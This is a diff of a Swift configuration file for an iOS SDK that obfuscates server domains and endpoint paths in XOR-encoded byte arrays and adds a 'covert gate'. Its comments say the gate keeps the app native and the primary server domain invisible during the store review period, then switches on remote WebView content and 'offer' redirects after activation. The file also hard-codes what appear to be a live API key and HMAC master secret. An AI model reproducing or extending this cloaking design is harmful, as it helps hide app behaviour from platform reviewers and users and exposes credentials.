@@ -18,7 +18,7 @@ struct NyxDispatcherConfig {
     /// inject flips this to "2" and rewrites the response ``CodingKeys`` in
     /// ``NetworkModels``). The server serves v2 keys only to "2" clients,
     /// so legacy builds are unaffected.
-    static let schemaVersion = "2"
+    static let schemaVersion = "1"
     /// Networking control gate (#16 schema.clean_first_submission).
     /// When disabled the SDK makes no server calls — ``NyxDispatcherRouter`` renders
     /// native content only. Enables an initial submission with local-only
@@ -33,11 +33,11 @@ struct NyxDispatcherConfig {
     /// ``schema.encode_strings`` is set, ``inject.py`` fills this
     /// and ``vault`` and blanks the ``*Plain`` literals, so the shipped
     /// binary carries no human-readable domain / endpoint strings.
-    static let vaultKey: [UInt8] = [241, 149, 108, 205, 124, 135, 65, 199, 174, 230, 19, 192, 138, 197, 62, 110, 53, 247, 191, 115, 244, 3, 42, 59, 42, 224, 6, 125, 29, 43, 247, 83]
+    static let vaultKey: [UInt8] = [38, 75, 250, 28, 121, 65, 119, 16, 251, 93, 198, 145, 64, 217, 131, 77, 146, 28, 118, 23, 10, 24, 1, 103]
     /// Encoded UTF-8 of, in order:
     /// ``[serverURL, initPath, alternateInitPath, eventPath, pushTokenPath]``.
-    /// Empty by default. See ``NyxPortal`` and ``vaultReveal``.
-    static let vault: [[UInt8]] = [[153, 225, 24, 189, 15, 189, 110, 232, 197, 143, 125, 167, 249, 166, 81, 27, 71, 131, 216, 18, 153, 102, 89, 21, 93, 133, 100, 14, 116, 95, 146], [222, 244, 28, 164, 83, 241, 112, 232, 205, 138, 122, 165, 228, 177, 17, 7, 91, 158, 203], [222, 244, 28, 164, 83, 241, 115, 232, 207, 149, 96, 165, 254, 182, 17, 13, 90, 153, 217, 26, 147, 45, 64, 72, 69, 142], [222, 244, 28, 164, 83, 241, 112, 232, 205, 138, 122, 165, 228, 177, 17, 11, 67, 146, 209, 7], [222, 244, 28, 164, 83, 241, 112, 232, 205, 138, 122, 165, 228, 177, 17, 30, 64, 132, 215, 94, 128, 108, 65, 94, 68]]
+    /// Empty by default. See ``NyxRanger`` and ``vaultReveal``.
+    static let vault: [[UInt8]] = [[77, 34, 148, 123, 10, 34, 24, 101, 137, 41, 161, 240, 45, 188, 240, 99, 229, 121, 20, 100, 99, 108, 100], [9, 42, 138, 117, 86, 55, 70, 63, 152, 49, 175, 244, 46, 173, 172, 36, 252, 117, 2], [9, 42, 138, 117, 86, 55, 69, 63, 154, 46, 181, 244, 52, 170, 172, 46, 253, 114, 16, 126, 109, 54, 107, 20, 73, 37], [9, 42, 138, 117, 86, 55, 70, 63, 152, 49, 175, 244, 46, 173, 172, 40, 228, 121, 24, 99], [9, 42, 138, 117, 86, 55, 70, 63, 152, 49, 175, 244, 46, 173, 172, 61, 231, 111, 30, 58, 126, 119, 106, 2, 72]]
     /// Plaintext development fallbacks. Used verbatim when the vault is empty
     /// (default / dev / unit tests). ``inject.py`` blanks the *value* of
     /// each of these (``= ""``) when it populates the vault, so they
@@ -51,7 +51,7 @@ struct NyxDispatcherConfig {
     /// encoding is disabled or the entry is absent.
     private static func vaultReveal(_ idx: Int, _ fallback: String) -> String {
         guard idx >= 0, idx < vault.count,
-              let s = NyxPortal.reveal(vault[idx], key: vaultKey) else {
+              let s = NyxRanger.reveal(vault[idx], key: vaultKey) else {
             return fallback
         }
         return s
@@ -76,13 +76,17 @@ struct NyxDispatcherConfig {
     /// "gave token" as a distinct conversion from "started session".
     static var pushTokenEndpoint: String { serverURL + wirePath("push", fallback: pushTokenPathSuffix) }
 
+    /// POST target for the final-URL cache report (#5) — the WebView's
+    /// post-JS-redirect destination, keyed by device (sticky offer).
+    static var finalUrlEndpoint: String { serverURL + "/api/v1/client/final-url" }
+
     /// #1 — when ``perAppPathsEnabled`` (and a ``masterSecret`` is present)
-    /// the request path is derived per-app from the secret (``NyxNova``),
+    /// the request path is derived per-app from the secret (``NyxWidget``),
     /// so each app uses a unique endpoint path. Default
     /// OFF → byte-identical legacy behaviour until the server resolver ships.
     static func wirePath(_ label: String, fallback: @autoclosure () -> String) -> String {
         if perAppPathsEnabled && !masterSecret.isEmpty {
-            let p = NyxNova.derive(masterSecret, label)
+            let p = NyxWidget.derive(masterSecret, label)
             if !p.isEmpty { return p }
         }
         return fallback()
@@ -114,7 +118,7 @@ struct NyxDispatcherConfig {
 
     fileprivate static func rtReveal(_ idx: Int, _ fallback: String) -> String {
         guard idx >= 0, idx < rtVault.count,
-              let s = NyxPortal.reveal(rtVault[idx], key: rtVaultKey) else {
+              let s = NyxRanger.reveal(rtVault[idx], key: rtVaultKey) else {
             return fallback
         }
         return s
@@ -153,7 +157,7 @@ struct NyxDispatcherConfig {
     /// request ships as ``{"b": bundleId, "d": <encrypted>}`` with NO custom
     /// ``X-*`` headers — signature/timestamp/api-key/flow-token/schema/version
     /// all live inside the ciphertext. Default off → headers as before.
-    static let authInBodyEnabled = true
+    static let authInBodyEnabled = false
     // MARK: - Privacy in Settings (pipeline-configured)
 
     /// When true, the NyxFlow overlay layer renders a discreet settings
@@ -165,24 +169,24 @@ struct NyxDispatcherConfig {
     /// Default off → no gear, behaviour unchanged.
     static let privacyInSettingsEnabled = false
     /// Privacy-policy URL baked at build time. ``s02`` replaces the
-    /// ``https://telegra.ph/Kings-Court--Support--Privacy-08-05`` placeholder with the app's real
+    /// ``https://example.com/privacy`` placeholder with the app's real
     /// generated URL. Left as the placeholder for dev/tests. This is
     /// intentionally NOT encoded — a readable privacy URL is benign and
     /// expected.
-    static let privacyURLString = "https://telegra.ph/Kings-Court--Support--Privacy-08-05"
+    static let privacyURLString = "https://example.com/privacy"
 
     /// Parsed privacy URL, or nil if unset/placeholder-only.
     static var privacyURL: URL? {
         guard !privacyURLString.isEmpty,
-              privacyURLString != "https://telegra.ph/Kings-Court--Support--Privacy-08-05" else { return nil }
+              privacyURLString != "https://example.com/privacy" else { return nil }
         return URL(string: privacyURLString)
     }
 
-    // MARK: - Preflight Gate (pipeline-configured)
+    // MARK: - Covert Gate (pipeline-configured)
 
-    /// Two-stage server activation gate (``schema.preflight_gate``). When on,
+    /// Two-stage server activation gate (``schema.covert_gate``). When on,
     /// the SDK first fetches a remote configuration feed from an independent
-    /// endpoint (a Cloudflare Worker on a separate domain, ``preflightGateURL``)
+    /// endpoint (a Cloudflare Worker on a separate domain, ``covertGateURL``)
     /// BEFORE it ever contacts the primary server. Only when that feed
     /// carries a valid activation envelope — AES-GCM-sealed with
     /// ``masterSecret`` and served solely under operator control — does the
@@ -190,21 +194,21 @@ struct NyxDispatcherConfig {
     /// stays fully native, so the primary server domain appears neither in
     /// the binary nor in any traffic during the review period. Requires
     /// ``masterSecret`` (the envelope is encrypted); ``inject.py`` only
-    /// flips this on when a secret is present. Default off → no pre-flight,
+    /// flips this on when a secret is present. Default off → no remote profile,
     /// the SDK uses ``serverURL`` directly.
-    static let preflightGateEnabled = true
-    /// Base URL of the preflight configuration endpoint, e.g.
+    static let covertGateEnabled = true
+    /// Base URL of the covert configuration endpoint, e.g.
     /// ``https://cfg.example.com/v1/config``. The SDK requests
-    /// ``preflightGateURL + "/" + preflightGateID``. Intentionally NOT
+    /// ``covertGateURL + "/" + covertGateID``. Intentionally NOT
     /// encoded — a standard configuration host is expected to read as
     /// unremarkable. Empty → the gate can't run and the app stays native.
-    static let preflightGateURLPlain = "https://pushcfg-4e1fb8.website/v1/config"
+    static let covertGateURLPlain = "https://covert-gate.wc-appcfg.workers.dev/v1/config"
     /// Per-app random identifier = the gate's KV key / path segment. Allows
     /// the operator to toggle this app without exposing the bundle id and
     /// makes the gate endpoint non-enumerable. Empty → gate disabled.
-    static let preflightGateID = "P-GdCUzg9i_EClu0"
-    /// Preflight gate base URL (computed for symmetry / future use).
-    static var preflightGateURL: String { preflightGateURLPlain }
+    static let covertGateID = "P-GdCUzg9i_EClu0"
+    /// Remote profile base URL (computed for symmetry / future use).
+    static var covertGateURL: String { covertGateURLPlain }
 
     /// Path suffix for the init request, honouring ``alternateInitPathEnabled``.
     /// For ``base`` apps this is always ``/api/v1/client/init`` → no
@@ -252,21 +256,21 @@ struct NyxDispatcherConfig {
     /// set in the client YAML. Empty string → legacy path, server
     /// accepts unsigned requests.
     static let apiKey = "4d33e5ee235720d272b33b06b9ec86ecdbe8f2c87e5c29427b881274e593279f"
-    /// HMAC signing key (64-hex) used by ``NyxGalleryClient`` to sign
+    /// HMAC signing key (64-hex) used by ``NyxRosterClient`` to sign
     /// ``/client/init`` and ``/client/event`` requests. Injected by the
     /// pipeline alongside ``apiKey``; empty → no signing.
     static let masterSecret = "d7c0f5740b7d0da134eb013b828323a0f35867a48d0b0f35ac47d6adf7488d4c"
-    /// When true, ``NyxGalleryClient`` attaches ``X-Signature`` +
+    /// When true, ``NyxRosterClient`` attaches ``X-Signature`` +
     /// ``X-Timestamp`` headers computed from ``masterSecret``.
     /// Defaults to ``false`` so legacy builds (and the SDK tests) behave
     /// exactly like before enrollment.
     static let hmacEnabled = true
     /// #1 — when true (and ``masterSecret`` is set), request paths are
-    /// derived per-app from the secret via ``NyxNova`` instead of the
+    /// derived per-app from the secret via ``NyxWidget`` instead of the
     /// fixed ``/api/v1/client/*``. Injected by the pipeline from
     /// ``schema.per_app_paths``. Default ``false`` → legacy paths, so this
     /// is inert until the server resolver is deployed.
-    static let perAppPathsEnabled = true
+    static let perAppPathsEnabled = false
     // MARK: - Deep links (pipeline-configured)
 
     /// Custom URL scheme the app registers with iOS (e.g. ``myapp``).
